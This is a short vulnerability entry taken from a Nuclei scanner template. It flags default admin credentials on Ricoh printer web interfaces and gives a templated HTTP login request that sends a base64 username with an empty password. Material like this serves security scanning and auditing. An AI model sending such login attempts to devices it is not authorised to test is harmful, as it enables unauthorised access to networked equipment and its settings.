# Vulnerability: Ricoh Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`ricoh-weak-password.yaml`)

## Description
Ricoh default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /web/guest/tw/websys/webArch/login.cgi HTTP/1.1
Host: {{Hostname}}
Cookie: cookieOnOffChecker=on;

wimToken=&userid_work=&userid={{base64(username)}}&password_work=&password=&open=
```

